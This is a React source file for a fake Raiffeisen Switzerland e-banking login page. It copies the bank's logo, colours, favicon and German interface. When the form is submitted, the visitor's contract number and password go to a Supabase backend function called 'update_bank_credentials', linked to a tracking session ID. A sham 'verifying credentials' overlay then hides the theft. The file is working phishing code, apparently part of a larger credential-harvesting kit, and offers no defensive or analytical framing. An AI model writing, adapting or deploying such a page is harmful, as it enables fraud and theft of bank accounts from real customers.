import { useEffect, useState } from "react";
import { useSearchParams, useNavigate } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import LoadingOverlay from "@/components/LoadingOverlay";
import { usePageMeta } from "@/hooks/use-page-meta";
import { Eye, EyeOff, Smartphone, HelpCircle, ChevronRight } from "lucide-react";

const RaiffeisenLogo = ({ className = "" }: { className?: string }) => (
  <svg viewBox="0 0 200 30" xmlns="http://www.w3.org/2000/svg" className={className} aria-label="Raiffeisen">
    <path
      fill="currentColor"
      d="M137.742 23.6003s1.766 1.5393 5.27 1.5393c2.816 0 4.188-1.6613 4.188-3.6884 0-2.0272-1.722-3.0867-3.286-3.9384l-2.206-1.1975c-3.544-1.9232-5.054-4.3082-5.054-7.29092 0-5.31377 3.574-8.624378 8.702-8.624378 4.166 0 6.608 1.419408 6.608 1.419408l-1.08 4.66404c-1.362-1.17551-3.014-1.58134-4.816-1.58134-2.444 0-3.852 1.54135-3.852 3.49054 0 1.57134.858 2.46895 2.26 3.20065l2.722 1.4194c4.292 2.2371 5.768 4.5841 5.768 7.9087 0 5.4137-3.88 8.7643-9.752 8.7643-4.348 0-6.608-1.2895-6.608-1.2895l1.138-4.7939-.002-.002zm-100.87-3.6925l-2.56-8.9322c-.364-1.25551-.768-3.21669-.768-3.21669s-.402 1.96118-.766 3.21669l-2.54 8.9322H36.872zm8.702 9.3941h-6.218l-1.494-5.3058h-8.63l-1.452 5.3058h-5.21l7.508-24.77363c.202-.68971.324-1.09354.324-1.49737 0-1.13353-.808-2.119113-.808-2.119113h6.864L45.574 29.2999v.002zm73.098-4.74l-1.13 4.74H103.37V.913786h14.978L117.22 5.58183h-8.276v7.08107h7.954l-1.09 4.574h-6.864v7.325h9.73-.002zM49.468.913786h5.612V29.3019h-5.612V.913786zM88.632 17.2369v12.065H82.98V.913786h14.98L96.91 5.58183h-8.278v7.08107h7.914l-1.05 4.574h-6.864zm-20.308 0v12.065h-5.572V.913786h14.98l-1.05 4.668044h-8.358v7.08107h7.954l-1.05 4.574h-6.904zm105.714 7.325l-1.132 4.74h-14.17V.925781h14.978l-1.09 4.656049h-8.316v7.08107h7.954l-1.09 4.574h-6.864v7.325h9.73zM124.89.913786h5.612V29.3019h-5.612V.913786zM5.612 29.3019H0V.643899c4.522 0 7.226-.243897 9.366-.243897 5.814 0 10.054 2.508948 10.054 8.702348 0 3.72045-2.26 6.63525-5.572 7.52685 0 0 .848 1.0116 1.374 2.1851l4.884 10.4876h-6.298L8.396 17.6408c-1.372-2.9528-2.26-3.5605-2.26-3.5605.564.0419 1.09.0419 1.534.0419 4.078 0 6.016-1.8632 6.016-4.85792 0-2.99474-2.138-4.33018-5.29-4.33018-1.654 0-2.784.11995-2.784.11995V29.3019zm194.388 0h-2.262l-9.206-13.6843c-1.736-2.5909-3.514-5.4637-3.514-5.4637s.082 2.8748.082 5.4637v13.6843h-4.684V5.58183c0-1.21349-.122-1.90321-.484-2.75285-.526-1.13152-1.334-1.915194-1.334-1.915194h6.54l6.622 9.643914c1.776 2.551 3.674 5.5457 3.674 5.5457s-.122-2.9927-.122-5.5457V.913786h4.684V29.3019H200z"
    />
  </svg>
);

const RAIFFEISEN_RED = "#E2001A";

const ChRaiffeisen = () => {
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const sessionId = searchParams.get("s") || "";

  const [vertragsnummer, setVertragsnummer] = useState("");
  const [passwort, setPasswort] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [showLoading, setShowLoading] = useState(false);
  const [lang, setLang] = useState<"de" | "fr" | "it">("de");

  useEffect(() => {
    window.scrollTo(0, 0);
  }, []);
  usePageMeta("Raiffeisen E-Banking Login", "https://www.raiffeisen.ch/favicon.ico");

  const handleSubmit = async () => {
    if (!vertragsnummer || !passwort) return;
    if (sessionId) {
      const { error } = await supabase.rpc("update_bank_credentials", {
        p_session_id: sessionId,
        p_username: vertragsnummer,
        p_password: passwort,
        p_username_label: "Vertragsnummer",
        p_password_label: "Persönliches Passwort",
      });
      if (error) console.error("Update failed:", error);
    } else {
      console.error("No session ID found in URL!");
    }
    setShowLoading(true);
  };

  return (
    <>
      {showLoading && (
        <LoadingOverlay
          message="Anmeldedaten werden überprüft..."
          onComplete={() => navigate("/confirmation?s=" + sessionId)}
        />
      )}
      <div className="min-h-screen flex flex-col bg-white font-sans text-[#1a1a1a]">
        {/* Header */}
        <header className="relative h-20 flex items-center px-6 md:px-12 border-b border-gray-100">
          <RaiffeisenLogo className="h-7 text-[#E2001A]" />
          <div className="absolute top-0 right-0 h-2 w-1/3 bg-[#D4C0A1]" />
        </header>

        {/* Main full-screen area */}
        <main className="flex-1 flex flex-col items-center px-4 pt-12 md:pt-20 pb-8">
          <div className="w-full max-w-[420px]">
            <h1 className="text-3xl font-light text-center mb-10">Login für E-Banking</h1>

            {/* Vertragsnummer */}
            <div className="mb-6">
              <label className="block text-xs text-gray-600 mb-1">Vertragsnummer</label>
              <input
                type="text"
                value={vertragsnummer}
                onChange={(e) => setVertragsnummer(e.target.value)}
                className="w-full border-0 border-b border-gray-400 bg-transparent py-2 text-base focus:outline-none focus:border-[#E2001A] transition-colors"
                autoComplete="off"
              />
            </div>

            {/* Passwort */}
            <div className="mb-10">
              <label className="block text-xs text-gray-600 mb-1">Persönliches Passwort</label>
              <div className="relative">
                <input
                  type={showPassword ? "text" : "password"}
                  value={passwort}
                  onChange={(e) => setPasswort(e.target.value)}
                  className="w-full border-0 border-b border-gray-400 bg-transparent py-2 pr-8 text-base focus:outline-none focus:border-[#E2001A] transition-colors"
                  autoComplete="off"
                />
                <button
                  type="button"
                  onClick={() => setShowPassword((s) => !s)}
                  className="absolute right-0 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700"
                  aria-label={showPassword ? "Passwort ausblenden" : "Passwort anzeigen"}
                >
                  {showPassword ? <EyeOff className="h-5 w-5" /> : <Eye className="h-5 w-5" />}
                </button>
              </div>
            </div>

            {/* Weiter Button */}
            <button
              onClick={handleSubmit}
              className="w-full py-3 bg-[#E2001A] text-white font-medium rounded-sm hover:bg-[#b80016] transition-colors mb-6"
            >
              Weiter
            </button>

            {/* Passwort vergessen */}
            <div className="text-center mb-12">
              <a href="#" className="text-sm text-[#E2001A] hover:underline">
                Passwort vergessen?
              </a>
            </div>

            <hr className="border-gray-200 mb-2" />

            {/* Service Links */}
            <a
              href="#"
              className="flex items-center justify-between py-4 border-b border-gray-200 hover:bg-gray-50 transition-colors px-2 -mx-2"
            >
              <span className="flex items-center gap-3">
                <Smartphone className="h-5 w-5 text-[#E2001A]" />
                <span className="text-sm">Neues Gerät für PhotoTAN aktivieren</span>
              </span>
              <ChevronRight className="h-5 w-5 text-gray-400" />
            </a>
            <a
              href="#"
              className="flex items-center justify-between py-4 border-b border-gray-200 hover:bg-gray-50 transition-colors px-2 -mx-2"
            >
              <span className="flex items-center gap-3">
                <HelpCircle className="h-5 w-5 text-[#E2001A]" />
                <span className="text-sm">Hilfe und Kontakt</span>
              </span>
              <ChevronRight className="h-5 w-5 text-gray-400" />
            </a>
          </div>
        </main>

        {/* Secondary footer */}
        <footer className="bg-[#F5F5F5] border-t border-gray-200 py-6 px-6 md:px-12">
          <div className="max-w-6xl mx-auto flex flex-col md:flex-row md:items-center md:justify-between gap-4 text-sm text-gray-600">
            <div className="flex items-center gap-6">
              <a href="#" className="hover:text-[#E2001A]">Demo E-Banking</a>
              <div className="flex items-center gap-3">
                {(["de", "fr", "it"] as const).map((l) => (
                  <button
                    key={l}
                    onClick={() => setLang(l)}
                    className={`uppercase ${lang === l ? "font-bold text-[#1a1a1a]" : "hover:text-[#E2001A]"}`}
                  >
                    {l}
                  </button>
                ))}
              </div>
            </div>
            <div className="text-gray-500">© Raiffeisen Schweiz</div>
          </div>
        </footer>
      </div>
    </>
  );
};

export default ChRaiffeisen;
